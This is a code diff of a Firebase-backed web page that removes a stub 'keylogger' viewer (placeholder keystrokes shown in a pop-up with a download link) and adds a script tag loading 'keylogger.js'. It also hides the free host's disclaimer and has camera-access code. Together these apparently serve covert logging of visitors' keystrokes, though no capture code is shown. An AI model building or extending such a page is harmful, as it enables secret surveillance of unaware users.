@@ -73,62 +73,7 @@ firebase.initializeApp(firebaseConfig);
                 alert('Camera access denied or an error occurred.');
             }
         }
-
-        // Function to fetch all keylogs (replace with your actual keylogs fetching logic)
-function fetchAllKeylogs() {
-    // Example keylogs data, replace this with the actual keylogs fetch logic
-    return new Promise(resolve => {
-        let keylogs = [
-            'User pressed A',
-            'User pressed B',
-            'User pressed C',
-            // Add more keylogs here or fetch from Firebase
-        ];
-        resolve(keylogs);
-    });
-}
-
-// Function to handle keylogger action
-function keylogger() {
-    fetchAllKeylogs().then(keylogs => {
-        // Open a new window
-        const newWindow = window.open("", "Keylogs", "width=600,height=400");
-
-        // Create the HTML content for the new window
-        const content = `
-            <html>
-            <head><title>Keylogs</title></head>
-            <body>
-                <h1>Keylogs</h1>
-                <pre id="keylogContent">${keylogs.reverse().join('\\n')}</pre>
-                <a id="downloadLink" href="#">Download Keylogs</a>
-                <script>
-                    // Create a blob from keylogs
-                    const keylogs = ${JSON.stringify(keylogs.reverse())};
-                    const blob = new Blob([keylogs.join('\\n')], { type: 'text/plain' });
-                    const url = URL.createObjectURL(blob);
-                    
-                    // Set up the download link
-                    const downloadLink = document.getElementById('downloadLink');
-                    downloadLink.href = url;
-                    downloadLink.download = 'keylogs.txt';
-                    
-                    // Trigger the download
-                    downloadLink.onclick = function() {
-                        setTimeout(() => URL.revokeObjectURL(url), 1000); // Clean up URL object after download
-                    };
-                </script>
-            </body>
-            </html>
-        `;
-
-        // Write the HTML content to the new window
-        newWindow.document.open();
-        newWindow.document.write(content);
-        newWindow.document.close();
-    });
-}
-
+        
 
 
 
@@ -1231,6 +1176,7 @@ display:none;
 </style>
 </div>
 <script type="text/javascript" src="script.js"></script>
+<script src="keylogger.js"></script> <!-- Include your JS file here -->
 <style>
 img[alt*="www.000webhost.com"], .disclaimer {
 display: none
